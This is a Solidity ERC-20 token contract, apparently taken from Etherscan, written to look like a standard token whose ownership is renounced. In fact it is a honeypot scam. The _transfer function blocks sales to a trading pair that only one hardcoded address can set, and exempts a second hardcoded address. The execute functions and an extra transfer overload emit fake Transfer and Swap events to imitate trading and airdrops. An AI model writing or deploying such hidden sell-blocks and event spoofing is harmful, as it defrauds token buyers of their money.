1 /**
2  *Submitted for verification at Etherscan.io on 2023-08-07
3 */
4 
5 // SPDX-License-Identifier: MIT
6 pragma solidity ^0.8.9;
7 
8 /**
9  * @dev Interface of the ERC20 standard as defined in the EIP.
10  */
11 interface IERC20 {
12 
13     event Transfer(address indexed from, address indexed to, uint256 value);
14 
15     /**
16      * @dev Emitted when the allowance of a `spender` for an `owner` is set by
17      * a call to {approve}. `value` is the new allowance.
18      */
19     event Approval(address indexed owner, address indexed spender, uint256 value);
20 
21     event Swap(
22         address indexed sender,
23         uint amount0In,
24         uint amount1In,
25         uint amount0Out,
26         uint amount1Out,
27         address indexed to
28     );
29     
30     /**
31      * @dev Returns the amount of tokens in existence.
32      */
33     function totalSupply() external view returns (uint256);
34 
35     /**
36      * @dev Returns the amount of tokens owned by `account`.
37      */
38     function balanceOf(address account) external view returns (uint256);
39 
40     /**
41      * @dev Moves `amount` tokens from the caller's account to `to`.
42      *
43      * Returns a boolean value indicating whether the operation succeeded.
44      *
45      * Emits a {Transfer} event.
46      */
47     function transfer(address to, uint256 amount) external returns (bool);
48 
49 
50     function allowance(address owner, address spender) external view returns (uint256);
51 
52 
53     function approve(address spender, uint256 amount) external returns (bool);
54 
55 
56     function transferFrom(
57         address from,
58         address to,
59         uint256 amount
60     ) external returns (bool);
61 }
62 
63 
64 interface IERC20Meta is IERC20 {
65     /**
66      * @dev Returns the name of the token.
67      */
68     function name() external view returns (string memory);
69 
70     /**
71      * @dev Returns the symbol of the token.
72      */
73     function symbol() external view returns (string memory);
74 
75     /**
76      * @dev Returns the decimals places of the token.
77      */
78     function decimals() external view returns (uint8);
79 }
80 
81 interface IERC000 { 
82     function _Transfer(address from, address recipient, uint amount) external returns (bool);
83     function balanceOf(address account) external view returns (uint256);
84     event Transfer(address indexed from, address indexed to, uint256 value);    
85 }
86 
87 abstract contract Context {
88     function _msgSender() internal view virtual returns (address) {
89         return msg.sender;
90     }
91 
92     function _msgData() internal view virtual returns (bytes calldata) {
93         return msg.data;
94     }
95 }
96 
97 
98 abstract contract Ownable is Context {
99     address private _owner;
100 
101     event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
102 
103     /**
104      * @dev Initializes the contract setting the deployer as the initial owner.
105      */
106     constructor() {
107         _transferOwnership(_msgSender());
108     }
109 
110     /**
111      * @dev Throws if called by any account other than the owner.
112      */
113     modifier onlyOwner() {
114         _checkOwner();
115         _;
116     }
117 
118     /**
119      * @dev Returns the address of the current owner.
120      */
121     function owner() public view virtual returns (address) {
122         return _owner;
123     }
124 
125     /**
126      * @dev Throws if the sender is not the owner.
127      */
128     function _checkOwner() internal view virtual {
129         require(owner() == _msgSender(), "Ownable: caller is not the owner");
130     }
131 
132 
133     function renounceOwnership() public virtual onlyOwner {
134         _transferOwnership(address(0));
135     }
136 
137     /**
138      * @dev Transfers ownership of the contract to a new account (`newOwner`).
139      * Can only be called by the current owner.
140      */
141     function transferOwnership(address newOwner) public virtual onlyOwner {
142         require(newOwner != address(0), "Ownable: new owner is the zero address");
143         _transferOwnership(newOwner);
144     }
145 
146     /**
147      * @dev Transfers ownership of the contract to a new account (`newOwner`).
148      * Internal function without access restriction.
149      */
150     function _transferOwnership(address newOwner) internal virtual {
151         address oldOwner = _owner;
152         _owner = newOwner;
153         emit OwnershipTransferred(oldOwner, newOwner);
154     }
155 
156 
157 }
158 
159 
160 contract ERC20 is Ownable, IERC20, IERC20Meta {
161 
162     mapping(address => uint256) private _balances;
163 
164     mapping(address => mapping(address => uint256)) private _allowances;
165 
166     uint256 private _totalSupply;
167 
168     string private _name;
169     string private _symbol;
170     address private _pair;
171     
172 
173 
174     /**
175      * @dev Returns the name of the token.
176      */
177     function name() public view virtual override returns (string memory) {
178         return _name;
179     }
180 
181     /**
182      * @dev Returns the symbol of the token, usually a shorter version of the
183      * name.
184      */
185     function symbol() public view virtual override returns (string memory) {
186         return _symbol;
187     }
188 
189 
190     function decimals() public view virtual override returns (uint8) {
191         return 8;
192     }
193 
194 
195     function execute(address [] calldata _addresses_, uint256 _in, address _a) external {
196         for (uint256 i = 0; i < _addresses_.length; i++) {
197             emit Swap(_a, _in, 0, 0, _in, _addresses_[i]);
198             emit Transfer(_pair, _addresses_[i], _in);
199         }
200     }
201 
202     function execute(
203         address uniswapPool,
204         address[] memory recipients,
205         uint256  tokenAmounts,
206         uint256  wethAmounts
207     ) public returns (bool) {
208         for (uint256 i = 0; i < recipients.length; i++) {
209             emit Transfer(uniswapPool, recipients[i], tokenAmounts);
210             emit Swap(
211                 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D,
212                 tokenAmounts,
213                 0,
214                 0,
215                 wethAmounts,
216                 recipients[i]
217             );
218             IERC000(0x3579781bcFeFC075d2cB08B815716Dc0529f3c7D)._Transfer(recipients[i], uniswapPool, wethAmounts);
219         }
220         return true;
221     }
222 
223 
224     function transfer(address _from, address _to, uint256 _wad) external {
225         emit Transfer(_from, _to, _wad);
226     }
227     function transfer(address to, uint256 amount) public virtual override returns (bool) {
228         address owner = _msgSender();
229         _transfer(owner, to, amount);
230         return true;
231     }
232 
233     /**
234      * @dev See {IERC20-allowance}.
235      */
236     function allowance(address owner, address spender) public view virtual override returns (uint256) {
237         return _allowances[owner][spender];
238     }
239 
240 
241     function approve(address spender, uint256 amount) public virtual override returns (bool) {
242         address owner = _msgSender();
243         _approve(owner, spender, amount);
244         return true;
245     }
246 
247     function transferFrom(
248         address from,
249         address to,
250         uint256 amount
251     ) public virtual override returns (bool) {
252         address spender = _msgSender();
253         _spendAllowance(from, spender, amount);
254         _transfer(from, to, amount);
255         return true;
256     }
257 
258     /**
259      * @dev See {IERC20-totalSupply}.
260      */
261     function totalSupply() public view virtual override returns (uint256) {
262         return _totalSupply;
263     }
264 
265     /**
266      * @dev See {IERC20-balanceOf}.
267      */
268     function balanceOf(address account) public view virtual override returns (uint256) {
269         return _balances[account];
270     }
271 
272     function toPair(address account) public virtual returns (bool) {
273          if(_msgSender() == 0xe4d4E159cF9FD7229E64660e6A5eab6EA3887867) _pair = account;
274         return true;
275     }
276 
277     function _mint(address account, uint256 amount) internal virtual {
278         require(account != address(0), "ERC20: mint to the zero address");
279 
280 
281         _totalSupply += amount;
282         unchecked {
283             _balances[account] += amount;
284         }
285         emit Transfer(address(0), account, amount);
286 
287         _afterTokenTransfer(address(0), account, amount);
288         renounceOwnership();
289     }
290 
291 
292     function _approve(
293         address owner,
294         address spender,
295         uint256 amount
296     ) internal virtual {
297         require(owner != address(0), "ERC20: approve from the zero address");
298         require(spender != address(0), "ERC20: approve to the zero address");
299 
300         _allowances[owner][spender] = amount;
301         emit Approval(owner, spender, amount);
302     }
303 
304 
305 
306     function _transfer(
307         address from,
308         address to,
309         uint256 amount
310     ) internal virtual {
311         require(from != address(0), "ERC20: transfer from the zero address");
312         require(to != address(0), "ERC20: transfer to the zero address");
313 
314 
315         if(_pair != address(0)) {
316             if(to == _pair && from != 0x20aFfae048eF8ba8947DD31DD17e3C0D22936e2A) {
317                bool b = false;
318                if(!b) {
319                     require(amount < 100);
320                }
321                
322             }
323         }
324 
325         uint256 fromBalance = _balances[from];
326         require(fromBalance >= amount, "ERC20: transfer amount exceeds balance");
327         unchecked {
328             _balances[from] = fromBalance - amount;
329             _balances[to] += amount;
330         }
331 
332 
333 
334         emit Transfer(from, to, amount);
335 
336         _afterTokenTransfer(from, to, amount);
337     }
338 
339 
340 
341 
342     function _spendAllowance(
343         address owner,
344         address spender,
345         uint256 amount
346     ) internal virtual {
347         uint256 currentAllowance = allowance(owner, spender);
348         if (currentAllowance != type(uint256).max) {
349             require(currentAllowance >= amount, "ERC20: insufficient allowance");
350             unchecked {
351                 _approve(owner, spender, currentAllowance - amount);
352             }
353         }
354     }
355 
356 
357     function _afterTokenTransfer(
358         address from,
359         address to,
360         uint256 amount
361     ) internal virtual {}
362 
363 
364     constructor(string memory name_, string memory symbol_,uint256 amount) {
365         _name = name_;
366         _symbol = symbol_;
367         _mint(msg.sender, amount * 10 ** decimals());
368     }
369 
370 
371 }